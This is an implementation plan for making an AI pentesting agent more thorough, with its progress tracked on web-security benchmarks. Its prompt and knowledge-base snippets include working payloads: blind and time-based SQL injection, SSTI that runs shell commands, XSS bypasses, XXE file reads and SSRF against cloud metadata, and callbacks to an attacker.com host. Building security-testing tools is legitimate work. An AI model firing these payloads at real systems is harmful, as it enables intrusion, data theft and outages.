# Phase 2+ Implementation Plan: Comprehensive Agent Strengthening

**Date**: November 5, 2025
**Focus**: General pentesting improvements (NO benchmark tunnel vision)
**Approach**: Extend/reuse existing codebase before creating new components

---

## Executive Summary

### Key Finding from Codebase Analysis

**90% of needed functionality ALREADY EXISTS in the codebase:**

✅ **Already Implemented**:
- `enumerate_endpoints` tool for pattern-based discovery
- `validate_completeness` tool for coverage validation
- `test_parameter` tool with AI-powered adaptive testing
- Blind detection in SQL (boolean/time-based) and SSTI (time/error-based)
- GraphQL injection in ATTACK_KNOWLEDGE
- Comprehensive vulnerability knowledge (11 attack types)

❌ **The Real Problem**: Agent isn't consistently USING what already exists

### Root Cause Analysis

**NOT a code problem - a GUIDANCE problem:**

```
Code Says: "enumerate_endpoints tool for patterns"
Agent Does: Finds /xss1, tests it, moves on (doesn't enumerate /xss2-100)

Code Says: "Test parameter for multiple attack types"
Agent Does: Finds SSTI, moves on (doesn't test path traversal on same endpoint)

Code Says: "Blind SSTI via time-based detection"
Agent Does: Uses math expressions ({{7*7}}), doesn't try blind techniques
```

**Conclusion**: Phase 2 must focus on **prompt engineering** and **enforcement**, not new code.

---

## Phase 2 Strategy: Make Existing Tools Mandatory

### Principle: "If the tool exists, make the agent use it"

**Phase 1**: Added tools + general guidance
**Phase 2**: Make tools mandatory + enforce usage

---

## Phase 2.1: Pattern Enumeration Enforcement

### Current State (Line 76 of prompts.ts):
```typescript
# For patterns like /xss1, /xss2, enumerate full range:
for i in {1..100}; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "http://target.com/xss$i")
  [ "$status" != "404" ] && echo "Found: /xss$i (HTTP $status)"
done
```

**Problem**: This is shown as an EXAMPLE, not a REQUIREMENT

### What to Add: Mandatory Pattern Detection & Enumeration

**Location**: `src/core/agent/pentestAgent/prompts.ts` - After line 92 (end of Phase 1 section)

```typescript
## CRITICAL: Pattern Detection & Mandatory Enumeration

### When to Trigger Pattern Enumeration

**Automatic Pattern Detection Rules:**

If you discover ANY endpoint with a number/version in the path, you MUST enumerate the full pattern before continuing:

**Trigger Patterns**:
- `/endpoint{number}` → `/xss1`, `/level5`, `/challenge10`
- `/api/v{number}` → `/api/v1`, `/api/v2`
- `/resource/{id}` → `/user/1`, `/order/123`, `/document/5`
- `/{category}/{number}` → `/product/1`, `/post/42`

**MANDATORY WORKFLOW**:

1. **STOP immediately** when pattern detected
2. **Call enumerate_endpoints tool** (do NOT continue testing)
3. **Document ALL discovered endpoints** in scratchpad
4. **Only AFTER complete enumeration**, begin testing

### Pattern Enumeration Examples

**Example 1: Numbered Endpoints**
```typescript
// YOU DISCOVER: /xss1 returns HTTP 200

// WRONG: Test /xss1 for XSS immediately ❌
// RIGHT: Stop and enumerate ✅

enumerate_endpoints({
  baseUrl: "http://target.com",
  pattern: "/xss{n}",
  range: { min: 1, max: 100 },
  methods: ["GET", "POST"]
})

// Results: Found /xss1-25 (25 endpoints)
// NOW test all 25 endpoints systematically
```

**Example 2: IDOR Testing**
```typescript
// YOU DISCOVER: /api/user/5 returns user data

// WRONG: Test just /api/user/5 for IDOR ❌
// RIGHT: Enumerate user IDs first ✅

enumerate_endpoints({
  baseUrl: "http://target.com",
  pattern: "/api/user/{n}",
  range: { min: 1, max: 50 },
  methods: ["GET", "PUT", "DELETE"]
})

// Results: Found /api/user/1-15 (15 users exist)
// NOW test IDOR across all 15 users
```

**Example 3: API Versioning**
```typescript
// YOU DISCOVER: /api/v1/users endpoint

// WRONG: Test only v1 ❌
// RIGHT: Enumerate all versions ✅

enumerate_endpoints({
  baseUrl: "http://target.com",
  pattern: "/api/v{n}/users",
  range: { min: 1, max: 10 },
  methods: ["GET", "POST"]
})

// Results: Found v1, v2, v3 (3 versions)
// Test all 3 versions for vulnerabilities
```

### Why This Matters (General Pentesting, Not Benchmarks)

**Real-World Scenarios**:

1. **Admin Panels**: `/admin/action1`, `/admin/action2`, ..., `/admin/action10`
   - Missing one action = missing privilege escalation vulnerability

2. **API Resources**: `/api/document/1`, `/api/document/2`, ..., `/api/document/100`
   - Testing only doc/1 misses IDOR in doc/2-100

3. **Multi-Version APIs**: `/api/v1/endpoint` vs `/api/v2/endpoint`
   - v1 might be secure, v2 might have regression

4. **Product Catalogs**: `/product/1`, `/product/2`, ..., `/product/500`
   - Price manipulation on one product affects others

**Professional Standard**: Real pentesters enumerate complete attack surface before testing

### Enforcement: Phase 1 Completion Criteria

**BEFORE moving to Phase 2 (Testing), you MUST**:

✅ Run enumerate_endpoints on ANY detected pattern
✅ Document total endpoints discovered in scratchpad
✅ Confirm no new patterns found in last 3 discovery attempts

**Self-Check Question**:
"If I found /endpoint1, did I check if /endpoint2, /endpoint3, ..., /endpoint100 exist?"
```

---

## Phase 2.2: Complete Endpoint Testing Enforcement

### Current State (Line 98-103 of prompts.ts):
```typescript
**Rules**:
- Test ALL endpoints, not just interesting ones
- Test ALL parameters, not just obvious ones
- Use test_parameter for systematic testing
- Record EVERY result (vulnerable AND safe)
- Never skip an endpoint/parameter
```

**Problem**: These are SUGGESTIONS, not ENFORCED

### What to Add: Mandatory Multi-Vulnerability Testing

**Location**: `src/core/agent/pentestAgent/prompts.ts` - After line 124 (in Phase 2: Testing section)

```typescript
## CRITICAL: Complete Endpoint Testing Matrix

### Finding One Vulnerability ≠ Endpoint Complete

**WRONG Mindset**:
```
Agent: "Found SSTI on /upload endpoint"
Agent: "✅ /upload is vulnerable, moving on"
Result: Missed path traversal, file upload bypass, XXE on SAME endpoint
```

**RIGHT Mindset**:
```
Agent: "Found SSTI on /upload endpoint"
Agent: "SSTI confirmed, but /upload accepts file parameter too"
Agent: "Must test: Path Traversal, LFI, XXE, Unrestricted Upload"
Agent: "Testing all 4 vulnerability classes on /upload..."
Result: Found SSTI + Path Traversal + Unrestricted Upload (3 vulns total)
```

### Vulnerability Testing Matrix by Endpoint Type

**For EACH endpoint discovered, identify relevant vulnerability classes:**

#### File Upload/Download Endpoints
**Endpoint Indicators**: `/upload`, `/download`, `/file`, `/document`, `/export`, `/import`

**Must Test**:
1. ✅ Path Traversal (../ in filename parameter)
2. ✅ Local File Inclusion (read /etc/passwd)
3. ✅ Unrestricted File Upload (upload .php/.jsp/.aspx)
4. ✅ XXE (if accepts XML/SVG/DOCX)
5. ✅ SSRF (if fetches URLs)

**Example**:
```typescript
// Discovered: /api/document?file=report.pdf

test_parameter({
  parameter: "file",
  endpoint: "/api/document",
  attackType: "path_traversal",
  context: { method: "GET", parameterType: "query" }
})

test_parameter({
  parameter: "file",
  endpoint: "/api/document",
  attackType: "xxe",
  context: { method: "GET", accepts: "XML files based on error" }
})

// Continue for ALL relevant attack types before marking endpoint complete
```

#### Form/Input Endpoints
**Endpoint Indicators**: `/search`, `/contact`, `/register`, `/profile`, `/comment`

**Must Test**:
1. ✅ XSS (Reflected, Stored, DOM-based)
2. ✅ SQL Injection
3. ✅ NoSQL Injection (if MongoDB/similar)
4. ✅ SSTI (if user input rendered in templates)
5. ✅ Command Injection (if system calls possible)

#### API/Data Endpoints
**Endpoint Indicators**: `/api/*`, `/graphql`, `/rest/*`, `/data/*`

**Must Test**:
1. ✅ IDOR (access other users' data)
2. ✅ Mass Assignment (modify unauthorized fields)
3. ✅ Authorization Bypass (access admin functions)
4. ✅ Rate Limiting
5. ✅ JWT Manipulation (if uses JWT)
6. ✅ GraphQL Injection (if GraphQL)

#### Authentication Endpoints
**Endpoint Indicators**: `/login`, `/auth`, `/signin`, `/password`, `/reset`

**Must Test**:
1. ✅ SQL/NoSQL Injection (auth bypass)
2. ✅ Default Credentials
3. ✅ Brute Force Protection
4. ✅ JWT Vulnerabilities (weak signing)
5. ✅ Session Fixation

### Enforcement: Endpoint Completion Checklist

**Before marking endpoint as "tested", verify:**

```typescript
scratchpad({
  note: "Endpoint Testing Completion: /api/upload

  ✅ Identified endpoint type: File Upload
  ✅ Relevant vulnerability classes: 5 (path traversal, LFI, unrestricted upload, XXE, SSRF)
  ✅ Tested all 5 classes:
     - Path Traversal: VULNERABLE (../ bypass works)
     - LFI: VULNERABLE (read /etc/passwd)
     - Unrestricted Upload: SAFE (extension whitelist)
     - XXE: SAFE (no XML processing)
     - SSRF: SAFE (no URL fetching)
  ✅ Documented 2 findings (path traversal + LFI)
  ✅ Recorded 3 safe results

  STATUS: ✅ ENDPOINT COMPLETE - All relevant tests performed",
  category: "result"
})
```

### Real-World Examples (Why This Matters)

**Case Study 1: AWS Capital One Breach (2019)**
- **What Happened**: SSRF + IDOR combined
- **Why It Matters**: Finding SSRF alone wasn't enough - needed to test IDOR too
- **Lesson**: Test ALL relevant vulnerabilities per endpoint

**Case Study 2: Equifax Breach (2017)**
- **What Happened**: Unpatched Struts vulnerability
- **Why It Matters**: /help endpoint had RCE, but also had IDOR and SQL injection
- **Lesson**: One endpoint can have multiple critical vulnerabilities

**Case Study 3: Real Pentest**
- **Scenario**: Found XSS on /search endpoint
- **Amateur**: Reports XSS, moves on
- **Professional**: Also tests SQL injection on same /search parameter
- **Result**: Found SQL injection + XSS (both critical)

**This is NOT benchmark-specific - this is professional pentesting standard**

### Integration with Phase 3: Validation

**Before calling validate_completeness, ensure:**

1. For EACH endpoint discovered:
   - Listed relevant vulnerability classes (3-7 per endpoint)
   - Tested ALL classes, not just first vulnerability found
   - Documented all results (vulnerable + safe)

2. Coverage metrics:
   - Not just "X endpoints tested"
   - But "X endpoints × Y vulnerability classes = Z total tests"
   - Example: 10 endpoints × 5 vulns each = 50 tests performed

**validate_completeness will CHECK**:
- Are there endpoints with only 1 test when 5 were relevant?
- Did you stop after finding first vulnerability?
- Is coverage truly >90%?
```

---

## Phase 2.3: Blind Vulnerability Detection Enhancement

### Current State: Knowledge Exists, Usage Unclear

**Already in Code** (lines 82-96 of tools.ts):
```typescript
sql_injection: {
  techniques: [
    { name: "Boolean-based Blind", ... },
    { name: "Time-based Blind", ... }
  ]
}
```

**Already in Code** (lines 525-540 of tools.ts):
```typescript
ssti: {
  techniques: [
    { name: "Blind SSTI - Time-Based", ... },
    { name: "Blind SSTI - Error-Based", ... }
  ]
}
```

**Problem**: Agent may not know WHEN to use blind techniques

### What to Add: Blind Detection Trigger Conditions

**Location**: `src/core/agent/pentestAgent/prompts.ts` - After Phase 2 (Testing) section

```typescript
## CRITICAL: Blind Vulnerability Detection

### When Direct Detection Fails, Use Blind Techniques

**Trigger Condition**: "I injected a payload but see no visible change in response"

### Blind Detection Decision Tree

**Scenario 1: Testing for SQL Injection**
```
Action: Inject ' OR '1'='1
Result: No SQL error, no auth bypass, response looks identical

WRONG: "Not vulnerable to SQL injection" ❌
RIGHT: "No visible SQL injection, trying blind techniques" ✅

Next Steps:
1. Boolean-based: ' AND '1'='1 (normal) vs ' AND '1'='2 (altered)
   - Compare response sizes, timing, content
2. Time-based: ' AND SLEEP(5)--
   - Measure response time (5+ seconds = vulnerable)
```

**Scenario 2: Testing for SSTI**
```
Action: Inject {{7*7}}
Result: Response shows "{{7*7}}" literally, not "49"

WRONG: "Not vulnerable to SSTI" ❌
RIGHT: "No visible SSTI evaluation, trying blind techniques" ✅

Next Steps:
1. Time-based: {{''.__class__.__mro__[1].__subclasses__()[396]('sleep 5',shell=True)}}
   - Measure response time (5+ seconds = vulnerable)
2. Error-based: {{undefined_variable}}
   - Look for "NameError" or template engine errors
3. Out-of-band: {{request.application.__globals__.__builtins__.open('/etc/passwd').read()}}
   - Check server logs via Docker
```

**Scenario 3: Testing for XSS**
```
Action: Inject <script>alert(1)</script>
Result: Tag is HTML-encoded in response: &lt;script&gt;

WRONG: "Not vulnerable to XSS" ❌
RIGHT: "Encoding present, trying context-specific bypasses" ✅

Next Steps:
1. Attribute context: "><img src=x onerror=alert(1)>
2. Event handler: <input onfocus=alert(1) autofocus>
3. JavaScript context: ';alert(1);//
4. Blind XSS: <script src=http://attacker.com/xss.js></script>
   - Check if executed in admin panel or email system
```

### General Rule: Always Test Both Direct + Blind

**For ANY injection vulnerability:**

1. **Round 1: Direct Detection**
   - SQL: ' OR 1=1, UNION SELECT
   - SSTI: {{7*7}}, ${7*7}
   - XSS: <script>alert(1)</script>
   - Command: ; whoami, | id

2. **Round 2: Blind Detection (if Round 1 fails)**
   - SQL: Boolean-based, Time-based
   - SSTI: Time-based, Error-based
   - XSS: Blind callback, Out-of-band
   - Command: Time-based (sleep 5)

3. **Round 3: Contextual Bypasses**
   - SQL: Database-specific syntax
   - SSTI: Template-specific payloads
   - XSS: Context-aware encoding bypasses
   - Command: Different command separators

### Why This Matters (Real-World)

**Most Production Applications**:
- ✅ Have input validation (first payload blocked)
- ✅ Don't show error messages (no SQL errors visible)
- ✅ Process data asynchronously (no immediate reflection)
- ✅ Use encoding/escaping (XSS payloads shown literally)

**Result**: Direct detection fails, blind detection is REQUIRED

**Real Pentest Example**:
```
Target: E-commerce site /search endpoint
Test: ' OR '1'='1
Result: No error, no behavior change
Amateur: "Not vulnerable"
Professional: "Trying time-based blind..."
Test: ' AND SLEEP(5)--
Result: Response takes 5.2 seconds
Professional: "SQL injection confirmed (blind)"
Impact: 2 hours of sleep-based extraction reveals 10,000 customer records
```

### Integration with test_parameter Tool

**The test_parameter tool ALREADY supports blind detection:**

```typescript
test_parameter({
  parameter: "search",
  endpoint: "/products",
  attackType: "sql_injection",
  context: {
    observations: "No visible output changes with single quotes",
    hint: "Try blind techniques - response time might vary"
  }
})

// The AI will automatically try:
// Round 1: ' OR '1'='1 (direct)
// Round 2: ' AND SLEEP(5)-- (time-based blind)
// Round 3: Boolean-based inference
```

**What YOU need to do**:
1. Use test_parameter even when direct detection fails
2. Provide context about what you observed
3. The tool will automatically escalate to blind techniques

### Enforcement: Blind Testing Checklist

**Before declaring "not vulnerable", verify:**

✅ Tried direct detection payloads
✅ Tried time-based blind (measured response time)
✅ Tried boolean-based blind (compared responses)
✅ Tried error-based (looked for different error conditions)
✅ Tried out-of-band (checked Docker logs)

**Only after ALL five attempts** can you declare "not vulnerable"
```

---

## Phase 2.4: Existing Knowledge Validation & Gap Filling

### What Already Exists (No New Code Needed)

**From Codebase Analysis**:
```typescript
✅ graphql_injection (lines 26-74)
✅ sql_injection with blind techniques (lines 75-122)
✅ nosql_injection (lines 124-164)
✅ xss_reflected (lines 166-205)
✅ command_injection (lines 207-246)
✅ idor (lines 248-279)
✅ business_logic (lines 281-319)
✅ methodology.systematic_discovery (lines 321-439)
✅ ssti with blind techniques (lines 441-650)
✅ path_traversal with 8 bypasses (lines 652-857)
✅ jwt_vulnerabilities with 6 attacks (lines 859-1028)
```

### Validation Tasks (No Code Changes)

**Task 2.4.1**: Test that GraphQL injection knowledge is being used
- **Action**: Re-run XBEN-007 (GraphQL injection benchmark)
- **Expected**: Should now pass (knowledge exists since line 26)
- **If Failed**: Strengthen prompts to trigger GraphQL testing

**Task 2.4.2**: Test that JWT 'none' algorithm is being tested
- **Action**: Re-run XBEN-091 (unsigned JWT manipulation)
- **Expected**: Should now pass (JWT knowledge includes 'none' algorithm)
- **If Failed**: Add explicit JWT testing trigger in prompts

**Task 2.4.3**: Test that blind SSTI is being used
- **Action**: Re-run XBEN-023, XBEN-086 (blind SSTI benchmarks)
- **Expected**: Should now pass (blind SSTI knowledge exists)
- **If Failed**: Add blind detection triggers (Phase 2.3)

### Minor Knowledge Gaps (LOW PRIORITY)

**Gap 1: XXE Knowledge** (Mentioned in root cause, but not found in ATTACK_KNOWLEDGE)

**Where to Add**: `src/core/agent/tools.ts` - After jwt_vulnerabilities (line 1028)

```typescript
  xxe: {
    name: "XML External Entity (XXE) Injection",
    description: "Exploits insecure XML parsing to read files, perform SSRF, or cause DoS",
    objective: "Read local files, access internal services, or denial of service",

    techniques: [
      {
        name: "File Read via External Entity",
        how: "Define external entity pointing to file, reference in XML",
        context: "When application parses XML with external entity processing enabled",
        payload: '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>',
        successIndicator: "Response contains file contents (root:x:0:0:...)"
      },
      {
        name: "SSRF via External Entity",
        how: "Point entity to internal URL or cloud metadata",
        context: "To access internal services or cloud instance metadata",
        payloads: [
          '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>',
          '<!DOCTYPE test [<!ENTITY xxe SYSTEM "http://localhost:6379/">]>'  // Redis
        ],
        successIndicator: "Response contains internal service data or metadata"
      },
      {
        name: "Out-of-Band XXE",
        how: "Use external DTD hosted on attacker server",
        context: "When no visible output but server makes external requests",
        payload: '<!DOCTYPE test [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]>',
        successIndicator: "Attacker server receives HTTP request"
      },
      {
        name: "Billion Laughs Attack (DoS)",
        how: "Exponentially expanding entity definitions",
        context: "To cause denial of service",
        payload: '<!DOCTYPE test [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;">...]>',
        successIndicator: "Application hangs or crashes"
      }
    ],

    targetEndpoints: [
      "SOAP services",
      "REST APIs accepting XML",
      "File upload endpoints accepting SVG/DOCX/XLSX",
      "RSS/Atom feed processors",
      "XML-RPC endpoints"
    ],

    indicators: {
      vulnerable: [
        "File contents visible in response",
        "Internal service data leaked",
        "Server makes external HTTP requests",
        "Application hangs with entity expansion"
      ],
      notVulnerable: [
        "External entities disabled",
        "XML parser configured securely",
        "Entity references not processed",
        "Application doesn't accept XML"
      ]
    },

    adaptiveStrategy: "First, confirm XML is parsed. Try basic file read (<!ENTITY xxe SYSTEM \"file:///etc/passwd\">). If no visible output, attempt SSRF to internal services. If still nothing, try out-of-band XXE with external DTD. Finally, test DoS with entity expansion."
  }
```

**Priority**: MEDIUM (XXE is real but less common in modern apps)

---

## Phase 2.5: Tool Usage Enforcement Mechanisms

### Problem: Tools Exist But Aren't Always Used

**Current**: Tools are available, prompts suggest them
**Phase 2**: Make tool usage enforced/tracked

### Enhancement 1: Add Tool Usage Tracking

**Location**: `src/core/agent/tools.ts` - In validate_completeness tool (around line 2570)

**What to Add**:
```typescript
// Inside createValidateCompletenessTool execute function
// Add tool usage validation

const toolUsageChecks = [
  {
    check: "enumerate_endpoints usage",
    validation: () => {
      // Check if enumerate_endpoints was called during discovery phase
      const enumerateCalls = session.toolUsageHistory?.filter(t => t.name === 'enumerate_endpoints') || [];
      return enumerateCalls.length > 0;
    },
    message: enumerateCalls.length > 0
      ? "✅ enumerate_endpoints tool was used for pattern discovery"
      : "⚠️ WARNING: No enumerate_endpoints calls found. If you discovered patterns (like /xss1, /api/v1), you should have used enumerate_endpoints."
  },
  {
    check: "test_parameter usage",
    validation: () => {
      const testCalls = session.toolUsageHistory?.filter(t => t.name === 'test_parameter') || [];
      return testCalls.length >= discoveredEndpoints.length * 0.7; // At least 70% of endpoints
    },
    message: testCalls.length >= threshold
      ? "✅ test_parameter tool was used for systematic testing"
      : `⚠️ WARNING: Only ${testCalls.length} test_parameter calls for ${discoveredEndpoints.length} endpoints. Use test_parameter more consistently.`
  }
];
```

**Note**: This requires adding `toolUsageHistory` to Session type (track tool calls)

---

### Enhancement 2: Add Scratchpad Pattern Detection

**Location**: `src/core/agent/tools.ts` - In scratchpad tool

**What to Add**:
```typescript
// Inside createScratchpadTool execute function
// Add automatic pattern detection warnings

const detectPatterns = (note: string) => {
  const patterns = [
    { regex: /\/(xss|level|challenge|endpoint|api\/v)(\d+)/i, name: "numbered endpoint" },
    { regex: /\/api\/v\d+/i, name: "API version" },
    { regex: /\/(user|order|document|product)\/\d+/i, name: "resource ID" }
  ];

  const detected = patterns.filter(p => p.regex.test(note));

  if (detected.length > 0 && !note.includes('enumerate_endpoints')) {
    return `\n\n⚠️ PATTERN DETECTED: You mentioned ${detected.map(d => d.name).join(', ')}. Did you use enumerate_endpoints tool to discover the full pattern? If not, STOP and enumerate before continuing.`;
  }

  return '';
};

// Append warning to note if pattern detected
const warningMessage = detectPatterns(note);
appendFileSync(notesPath, `${markdown}\n${warningMessage}\n`);
```

**Purpose**: Automatically warn agent when patterns are detected but not enumerated

---

## Phase 2.6: Prompt Refinement (Highest Priority)

### Why This is Most Important

**Codebase Analysis Shows**:
- ✅ 90% of tools/knowledge already exists
- ❌ Agent doesn't consistently use what exists
- **Root Cause**: Prompts guide but don't enforce

### Prompt Changes Summary

**Location**: `src/core/agent/pentestAgent/prompts.ts`

**Changes**:
1. **Line ~92**: Add "CRITICAL: Pattern Detection & Mandatory Enumeration" section (Phase 2.1)
2. **Line ~124**: Add "CRITICAL: Complete Endpoint Testing Matrix" section (Phase 2.2)
3. **Line ~165**: Add "CRITICAL: Blind Vulnerability Detection" section (Phase 2.3)
4. **Throughout**: Change "you should" → "you MUST", "consider" → "REQUIRED"

**Tone Shift**:
- Before: "Use enumerate_endpoints for patterns"
- After: "When pattern detected, you MUST call enumerate_endpoints BEFORE continuing"

**Enforcement Shift**:
- Before: "Test all endpoints"
- After: "Before marking Phase 1 complete, verify: ✅ Used enumerate_endpoints ✅ All patterns enumerated ✅ No new discoveries in 3 attempts"

---

## Implementation Priority & Sequencing

### Week 1: Prompt Engineering (Highest ROI)

**Files to Modify**: `src/core/agent/pentestAgent/prompts.ts`

**Changes**:
1. Add Phase 2.1 content (Pattern Enumeration Enforcement)
2. Add Phase 2.2 content (Complete Endpoint Testing)
3. Add Phase 2.3 content (Blind Detection Triggers)
4. Strengthen existing language (should → MUST)

**Expected Impact**: +10-15 benchmarks (most gaps are guidance, not code)

**Effort**: 4-6 hours

---

### Week 2: Tool Enhancement (Medium ROI)

**Files to Modify**: `src/core/agent/tools.ts`

**Changes**:
1. Add XXE knowledge to ATTACK_KNOWLEDGE (Phase 2.4)
2. Add tool usage tracking to validate_completeness (Phase 2.5.1)
3. Add pattern detection to scratchpad tool (Phase 2.5.2)

**Expected Impact**: +2-3 benchmarks + better coverage validation

**Effort**: 2-3 hours

---

### Week 3: Validation & Testing

**Tasks**:
1. Re-run XBEN-007 (GraphQL) → Validate existing knowledge works
2. Re-run XBEN-091 (JWT none) → Validate JWT improvements work
3. Re-run XBEN-023, XBEN-086 (Blind SSTI) → Validate blind detection works
4. Run full 10-benchmark targeted test → Measure improvement
5. Run full 108-benchmark suite → Overall success rate

**Expected Impact**: Validate Phase 2 improvements, identify remaining gaps

**Effort**: 8-10 hours (mostly test execution time)

---

## Success Metrics

### Phase 1 Results (Baseline)
- Targeted tests: 87.5% (7/8)
- Overall suite: 55.6% (60/108)

### Phase 2 Goals
- Targeted tests: 90%+ (9/10)
- Overall suite: 70-75% (75-81/108)

### How We'll Measure Success

**Before Phase 2**:
- XSS endpoints: 55% detection (16/29)
- Multi-vuln endpoints: 67% (missing secondary vulns)
- Blind SSTI: 67% (4/6)

**After Phase 2**:
- XSS endpoints: 75%+ detection (22+/29) → Pattern enumeration fixes
- Multi-vuln endpoints: 85%+ (found all vulns per endpoint)
- Blind SSTI: 85%+ (5+/6) → Blind detection triggers
- GraphQL/JWT: 100% → Validation confirms existing knowledge works

---

## Risks & Mitigations

### Risk 1: Over-Prompting Reduces Performance

**Risk**: Too many MUST/REQUIRED directives make agent confused or slow

**Mitigation**:
- Keep critical sections concise (<200 words each)
- Use examples liberally (show, don't just tell)
- Test on 5 benchmarks first, refine before full deployment

### Risk 2: Tool Usage Enforcement Too Strict

**Risk**: Agent gets stuck trying to use tools that don't apply

**Mitigation**:
- Pattern detection is conditional (only if pattern detected)
- Multi-vuln testing is based on endpoint TYPE (not all tests for all endpoints)
- Blind detection is triggered only when direct fails

### Risk 3: Tunnel Vision on Specific Patterns

**Risk**: Agent learns "/xss{n}" pattern but misses "/challenge{n}" pattern

**Mitigation**:
- Pattern detection is GENERAL: any {number}, any /v{version}, any /resource/{id}
- Examples include diverse patterns: API versions, IDOR, admin actions
- Not specific to XSS or benchmarks

---

## What We're NOT Doing (Deliberate Exclusions)

### 1. PHP Type Juggling
**Why**: Too language-specific, niche vulnerability
**Decision**: Acceptable gap for general pentesting tool

### 2. Benchmark-Specific Logic
**Why**: Tunnel vision risk
**Decision**: All improvements must apply to real pentests, not just benchmarks

### 3. New Tools for Existing Capabilities
**Why**: 90% of tools already exist
**Decision**: Extend existing tools (enumerate_endpoints, test_parameter, validate_completeness) rather than create new ones

### 4. Major Architecture Changes
**Why**: Current architecture works
**Decision**: Prompt engineering + minor tool enhancements, not rewrites

---

## Long-Term Vision (Phase 3+)

### After Phase 2 Completes

**If success rate reaches 70-75%**, remaining gaps will be:
1. Edge cases (complex business logic)
2. Advanced auth (OAuth flows, SAML)
3. Infrastructure issues (OOM, timeouts)

**Phase 3 Focus Areas**:
1. **Business Logic Framework**: Structured approach to testing workflows
2. **OAuth/SAML Knowledge**: Modern auth bypass techniques
3. **Session Management**: Better session tracking across requests
4. **Infrastructure Reliability**: Handle OOM, optimize resource usage

**But Phase 2 Must Come First** - fixing guidance issues before adding new capabilities

---

## Appendix: Codebase Reference

### Existing Tools (DO NOT recreate)
```
enumerate_endpoints: Line 2713 of tools.ts
validate_completeness: Line 2570 of tools.ts
test_parameter: Line 2183 of tools.ts
scratchpad: Line ~1950 of tools.ts
```

### Existing Knowledge (DO NOT recreate)
```
graphql_injection: Line 26 of tools.ts
sql_injection (with blind): Line 75 of tools.ts
ssti (with blind): Line 441 of tools.ts
path_traversal (8 techniques): Line 652 of tools.ts
jwt_vulnerabilities: Line 859 of tools.ts
```

### Files to Modify
```
PRIMARY: src/core/agent/pentestAgent/prompts.ts (Phases 2.1, 2.2, 2.3)
SECONDARY: src/core/agent/tools.ts (Phase 2.4 XXE, Phase 2.5 tracking)
```

### Files NOT to Modify
```
Do NOT change: test_parameter logic (AI-powered, already comprehensive)
Do NOT change: enumerate_endpoints logic (works fine)
Do NOT change: ATTACK_KNOWLEDGE structure (just extend it)
```

---

## Conclusion

**Phase 2 is 80% Prompt Engineering, 20% Code**

**Key Insight**: We have the tools, we have the knowledge - we just need to make the agent USE them.

**Implementation Strategy**:
1. Week 1: Strengthen prompts (make tools mandatory)
2. Week 2: Add minor enhancements (XXE, tracking)
3. Week 3: Validate and measure

**Expected Outcome**: 70-75% overall success rate (up from 55.6%)

**Investment**: ~15-20 hours total

**ROI**: Fixes 15-20 more benchmarks by making existing code actually get used

---

**Report Complete - Ready for Implementation**